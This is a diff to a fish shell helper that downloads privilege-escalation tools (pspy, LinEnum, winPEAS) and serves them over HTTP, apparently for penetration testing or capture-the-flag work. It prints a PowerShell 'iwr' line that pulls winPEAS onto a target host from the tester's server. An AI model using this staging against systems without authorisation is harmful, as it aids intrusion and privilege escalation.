@@ -13,6 +13,8 @@ function pwncat --description "fetch privesc tools and serve them over HTTP"
         https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32 \
         https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
+    # not wrapped in __run: fetching tools onto your own box is setup, not an
+    # action against the target, and it only happens once anyway
     for i in (seq (count $names))
         if not test -f $dir/$names[$i]
             echo "[*] fetching $names[$i]"
@@ -31,5 +33,6 @@ function pwncat --description "fetch privesc tools and serve them over HTTP"
     echo "           iwr http://$ip/winPEASx64.exe -o w.exe"
     echo
 
-    cd $dir; and sudo python3 -m http.server 80
+    # --directory instead of cd: serving no longer strands your shell in ~/tools
+    __run sudo python3 -m http.server 80 --directory $dir
 end
